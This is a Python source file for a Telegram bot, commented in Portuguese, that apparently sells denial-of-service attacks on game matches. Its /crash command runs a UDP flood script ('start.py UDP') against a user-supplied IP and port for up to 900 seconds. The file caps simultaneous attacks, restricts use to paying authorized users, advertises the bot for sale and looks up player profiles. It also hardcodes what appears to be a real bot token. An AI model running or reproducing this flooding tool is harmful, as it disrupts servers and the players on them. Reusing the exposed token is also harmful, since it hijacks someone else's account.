import telebot
import subprocess
import re
import requests
import time
import json
from datetime import datetime

# Configurações do bot
BOT_TOKEN = "7972626459:AAGjV9QjaDRfEYXOO-X4TgXoWo2MqQbwMz8"
SEU_ID_TELEGRAM = 6430703027
bot = telebot.TeleBot(BOT_TOKEN)
processos = {}
MAX_ATTACKS = 3  # Limite de ataques simultâneos

# Função para carregar usuários autorizados de um arquivo JSON
def carregar_usuarios():
    try:
        with open("usuarios_autorizados.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return [SEU_ID_TELEGRAM]  # Adiciona o ID do dono como padrão
    except json.JSONDecodeError:
        return [SEU_ID_TELEGRAM]

# Função para salvar usuários autorizados em um arquivo JSON
def salvar_usuarios():
    with open("usuarios_autorizados.json", "w") as f:
        json.dump(authorized_users, f)

# Lista de usuários autorizados
authorized_users = carregar_usuarios()

# Função para validar o formato de IP:PORTA
def validar_ip_porta(ip_porta):
    padrao = r'^\d{1,3}(\.\d{1,3}){3}:\d+$'
    return re.match(padrao, ip_porta) is not None

# Função para gerenciar o limite de ataques simultâneos
def manage_attacks():
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]
        oldest_process.terminate()
        del processos[list(processos.keys())[0]]

# Função de ataque contínuo
def ataque_continuo(ip_porta, tempo=900):
    for _ in range(tempo // 5):
        subprocess.Popen(f"python3 start.py UDP {ip_porta} 10 900", shell=True)
        time.sleep(5)
    if ip_porta in processos:
        del processos[ip_porta]

# Comando /menu
@bot.message_handler(commands=['menu'])
def menu(message):
    welcome_text = (
        "Bem-vindo ao bot! 🚀\n\n"
        "Aqui estão os comandos disponíveis para você:\n\n"
        "*Comandos básicos:*\n"
        "`/crash <IP da partida> [tempo]` - Envia um ataque ao IP especificado. "
        "(Padrão 900 segundos)\n"
        "`/meuid` - Mostra seu ID de usuário.\n"
        "`/info_player <ID>` - Exibe informações de um jogador por ID.\n\n"
        "*Comandos para o dono do bot:*\n"
        "`/adduser <ID>` - Adiciona um usuário autorizado.\n"
        "`/removeuser <ID>` - Remove um usuário autorizado.\n"
        "`/listusers` - Mostra a lista de usuários autorizados e seus cargos.\n\n"
        "Quer comprar o bot? Entre em contato comigo no Telegram: "
        "[werbert_ofc](https://t.me/werbert_ofc)\n\n"
        "_Se precisar de ajuda, estou à disposição!_ 😉"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

# Comando /info_player
@bot.message_handler(commands=['info_player'])
def info_player(message):
    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "Uso correto: /info_player <ID do jogador>")
        return

    player_id = message.text.split()[1]
    url = f"https://api.nowgarena.com/api/info_player?id={player_id}&region=br"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data["success"]:
                player_info = data["data"]["PlayerBasicInfo"]
                nickname = player_info.get("AccountNickname", "Desconhecido")
                level = player_info.get("AccountLevel", "Desconhecido")
                exp = player_info.get("AccountExp", "Desconhecido")
                br_rank = player_info["BRRank"].get("Rank", "Desconhecido")
                cs_rank = player_info["CSRank"].get("Rank", "Desconhecido")
                likes = player_info.get("PlayerLikes", "0")
                last_login = player_info.get("Last_Login_At", "Desconhecido")
                elite_pass_status = player_info["PlayerElitePass"].get("Status", "Desconhecido")
                elite_pass_level = player_info["PlayerElitePass"].get("Level", "Desconhecido")
                weapon_skin_shows = player_info.get("weaponSkinShows", "Nenhuma")
                # Convertendo o timestamp de "Último Login" para uma data legível
                if last_login != "Desconhecido":
                    last_login = datetime.utcfromtimestamp(int(last_login)).strftime('%Y-%m-%d %H:%M:%S')
                
                response_text = (
                    f"**Informações do Jogador:**\n"
                    f"👤 **Nickname:** {nickname}\n"
                    f"🎮 **Nível:** {level}\n"
                    f"⭐ **Experiência:** {exp}\n"
                    f"🏆 **Rank BR:** {br_rank}\n"
                    f"⚔️ **Rank CS:** {cs_rank}\n"
                    f"❤️ **Curtidas:** {likes}\n"
                    f"📅 **Último Login:** {last_login}\n"
                    f"🏅 **Elite Pass Status:** {elite_pass_status}\n"
                    f"🎖️ **Elite Pass Level:** {elite_pass_level}\n"
                    f"🗡️ **Skin de Arma:** {weapon_skin_shows}\n"
                )

                # Verificando se "clothes" existe antes de tentar acessar
                clothes_images = data["data"].get("ProfileInfo", {}).get("clothes", {}).get("images", [])
                if clothes_images:
                    response_text += "\n**Roupas equipadas:**\n"
                    for img in clothes_images:
                        response_text += f"![Roupas]({img})\n"

                # Habilidades equipadas
                equipped_skills = data["data"]["ProfileInfo"].get("equippedSkills", [])
                if equipped_skills:
                    response_text += "\n**Habilidades Equipadas:**\n"
                    for skill in equipped_skills:
                        response_text += f"- {skill}\n"

                bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, "Jogador não encontrado ou erro na API.")
        else:
            bot.send_message(message.chat.id, f"Erro ao consultar a API: {response.status_code}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Erro ao fazer a solicitação: {str(e)}")

# Comando /crash
@bot.message_handler(commands=['crash'])
def crash_server(message):
    if message.from_user.id not in authorized_users:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) < 2:
        bot.send_message(message.chat.id, "Uso correto: /crash <IP da partida>")
        return

    ip_porta = comando[1]
    tempo = 900  # Padrão 900 segundos
    potencia = 10  # Padrão 10

    # Verificar se o comando inclui o tempo (não é necessário, pois o padrão já é 900)
    if len(comando) == 3:
        try:
            tempo = int(comando[2])
        except ValueError:
            bot.send_message(message.chat.id, "Por favor, insira um tempo válido.")
            return

    # Verificar se o IP já tem um ataque em andamento
    if ip_porta in processos:
        bot.send_message(message.chat.id, f"Já existe um ataque em andamento para {ip_porta}.")
        return

    # Gerenciar o limite de ataques simultâneos
    if len(processos) >= MAX_ATTACKS:
        oldest_process = list(processos.values())[0]
        oldest_process.terminate()
        del processos[list(processos.keys())[0]]

    # Enviar comando no formato correto com 10 e 900 como padrão
    comando_ataque = ["python3", "start.py", "UDP", ip_porta, str(potencia), str(tempo)]
    processo = subprocess.Popen(comando_ataque)
    processos[ip_porta] = processo
    bot.send_message(message.chat.id, f"Ataque iniciado para {ip_porta} com potência {potencia} por {tempo} segundos.")

# Comando /meuid
@bot.message_handler(commands=['meuid'])
def send_user_id(message):
    bot.send_message(message.chat.id, f"Seu ID de usuário é: {message.from_user.id}")

# Comando /adduser e /removeuser
@bot.message_handler(commands=['adduser', 'removeuser'])
def admin_commands(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    comando = message.text.split()
    if len(comando) != 2:
        bot.send_message(message.chat.id, "Uso correto: /adduser <ID>, /removeuser <ID>")
        return

    try:
        usuario_id = int(comando[1])
    except ValueError:
        bot.send_message(message.chat.id, "ID inválido. Por favor, insira um número válido.")
        return

    if comando[0] == "/adduser":
        if usuario_id not in authorized_users:
            authorized_users.append(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usuário {usuario_id} adicionado com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário já autorizado.")
    
    elif comando[0] == "/removeuser":
        if usuario_id in authorized_users:
            authorized_users.remove(usuario_id)
            salvar_usuarios()
            bot.send_message(message.chat.id, f"Usuário {usuario_id} removido com sucesso.")
        else:
            bot.send_message(message.chat.id, "Usuário não encontrado na lista de autorizados.")

# Comando /listusers
@bot.message_handler(commands=['listusers'])
def list_users(message):
    if message.from_user.id != SEU_ID_TELEGRAM:
        bot.send_message(message.chat.id, "Acesso negado.")
        return

    if not authorized_users:
        bot.send_message(message.chat.id, "Não há usuários autorizados.")
    else:
        user_list = "\n".join([str(user) for user in authorized_users])
        bot.send_message(message.chat.id, f"Usuários autorizados:\n{user_list}")

# Função principal
def main():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    main()